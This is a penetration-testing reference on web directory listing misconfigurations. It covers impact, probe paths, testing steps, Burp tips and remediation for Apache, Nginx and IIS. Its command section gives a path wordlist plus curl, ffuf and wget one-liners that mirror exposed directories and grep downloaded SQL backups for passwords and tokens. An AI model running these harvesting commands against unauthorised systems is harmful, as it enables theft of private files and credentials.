# Directory Listing Enabled

## Overview
Directory listing is a web server feature that, when enabled, displays the contents of a directory as a browseable HTML page when no index file exists (no `index.html`, `index.php`, etc.). This allows attackers to enumerate all files in a directory without needing to guess filenames, directly discovering backup files, configuration files, database exports, uploaded files, log files, and other sensitive artifacts. Apache calls this `Options Indexes`; Nginx uses `autoindex on`. It is considered a security misconfiguration because it bypasses filename obscurity as a defense.

## How It Works
When a browser requests a directory URL (e.g., `https://target.com/uploads/`) and the web server has directory indexing enabled and no default index file exists, the server generates an HTML page listing all files and subdirectories. This listing includes file sizes and modification dates, giving attackers a complete map of the directory contents. An attacker navigating to such a directory can download any file listed, including sensitive files placed there accidentally.

## Impact
- Enumerate all files in exposed directories without brute-forcing
- Download configuration files, database backups, log files, and credentials
- Discover upload directories and their contents (user-uploaded files, admin exports)
- Find backup files and source code that would otherwise be obscured by filename
- Reveal internal application structure and file naming conventions
- Access private user data (uploaded documents, invoices, medical records)
- Discover API documentation, internal tools, or admin scripts

## Where to Look
- Upload directories: `/uploads/`, `/files/`, `/static/`, `/media/`, `/documents/`
- Application sub-paths: `/backup/`, `/backups/`, `/data/`, `/export/`, `/logs/`
- Admin directories: `/admin/`, `/management/`, `/internal/`
- API directories: `/api/v1/`, `/swagger/`, `/docs/`
- CMS-specific: `/wp-content/uploads/` (WordPress), `/sites/default/files/` (Drupal)
- Asset directories: `/assets/`, `/images/`, `/css/`, `/js/`
- Any path returned in HTTP responses or linked from pages where the directory may not have an index file

## Testing Steps
1. Navigate to known directory paths and observe if the browser shows a file listing.
2. Try common upload/data directories with trailing slash.
3. Run a directory brute-force looking for HTTP 200 responses on directory URLs.
4. Check each discovered directory for nested sub-directories that may also have listing enabled.
5. Download any interesting files found (config, backup, SQL, log files).
6. Check modification dates in listings for recently modified sensitive files.
7. Look for hidden files (files starting with `.`) in directory listings.

## Payloads / Techniques

```
# Common directory paths to check for listing
/uploads/
/files/
/static/
/media/
/documents/
/docs/
/backup/
/backups/
/data/
/exports/
/export/
/logs/
/log/
/temp/
/tmp/
/cache/
/assets/
/images/
/img/
/css/
/js/
/scripts/
/includes/
/include/
/lib/
/vendor/
/node_modules/
/admin/
/admin/uploads/
/admin/backups/
/api/
/internal/
/private/
/secret/

# CMS-specific upload directories
/wp-content/uploads/
/wp-content/uploads/2024/
/sites/default/files/
/modules/
/themes/
/plugins/
/fileadmin/           # TYPO3
/typo3temp/
/media/catalog/       # Magento
/var/export/          # Magento

# Application directories
/app/storage/
/storage/app/public/  # Laravel
/storage/logs/        # Laravel
/public/uploads/
/app/public/
```

```bash
# Check for directory listing (look for "Index of" in response)
curl -s "https://target.com/uploads/" | grep -i "index of\|parent directory\|last modified"

# Brute force directories and check for listing
ffuf -u "https://target.com/FUZZ/" \
  -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt \
  -mc 200 \
  -mr "Index of|Parent Directory" \
  -t 40

# If directory listing found, recursively download all files
wget -r --no-parent "https://target.com/uploads/"
wget -r --no-parent -A "*.sql,*.bak,*.log,*.conf,*.env" "https://target.com/backup/"

# Spider for directory listings using curl
curl -s "https://target.com/uploads/" | grep -oP 'href="[^"]*"' | sed 's/href="//;s/"//'

# Recursive download of specific file types from listing
wget -r --no-parent --accept "*.sql,*.bak,*.log,*.csv,*.zip" "https://target.com/exports/"
```

```bash
# Extract all linked files from a directory listing page
curl -s "https://target.com/uploads/" | \
  grep -oP '(?<=href=")[^"]+' | \
  grep -v "^\?" | \
  grep -v "^/" | \
  while read f; do
    echo "https://target.com/uploads/$f"
  done

# Download and search for credentials
wget -q "https://target.com/backup/" -O listing.html
grep -oP 'href="[^"]*\.sql"' listing.html | sed 's/href="//;s/"//' | \
  while read f; do
    echo "[+] Downloading $f"
    wget -q "https://target.com/backup/$f"
  done
grep -iE "password|passwd|secret|key|token" *.sql 2>/dev/null
```

## Burp Suite Tips
- In **Spider/Crawler**, enable content discovery — Burp will automatically follow links in directory listings and add them to the site map.
- Use **Target > Site Map** to see all discovered directories. Look for entries with many children — these may be listing-enabled directories.
- In **Active Scanner** (Pro), the "Directory listing" check will automatically identify directories that return Apache/Nginx directory listing pages.
- Filter **HTTP History** by response body containing "Index of" using the search function (Ctrl+F).
- After finding a directory listing, select all child URLs in the Site Map and run **Active Scan** on them to find vulnerabilities in individual files.

## Tools
- Burp Suite Pro (Spider, Scanner, Site Map)
- ffuf — directory listing detection with `-mr "Index of"`
- gobuster with dir mode
- dirsearch
- wget with `-r --no-parent` — recursive download from listings
- curl — manual inspection
- Nikto — automatic directory listing detection

## Remediation
- Apache: Remove `Options Indexes` from server and VirtualHost configuration. Set `Options -Indexes` explicitly.
- Nginx: Remove `autoindex on;` or add `autoindex off;` explicitly.
- IIS: Disable "Directory browsing" in IIS Manager > Site > Directory Browsing > Disable.
- Ensure all directories accessible via the web have an `index.html` or `index.php` (or configure `DirectoryIndex` to a custom page).
- Restrict access to sensitive directories (uploads, backups) at the web server level, not by relying on them not appearing in listings.
- Never place backup, export, or log files in the web root or any web-accessible directory.

## References
https://owasp.org/www-project-web-security-testing-guide/stable/4-Web_Application_Security_Testing/02-Configuration_and_Deployment_Management_Testing/04-Review_of_Webpage_Contents_for_Information_Leakage
https://portswigger.net/web-security/information-disclosure/exploiting
https://cwe.mitre.org/data/definitions/548.html
https://httpd.apache.org/docs/2.4/mod/core.html#options
https://nginx.org/en/docs/http/ngx_http_autoindex_module.html
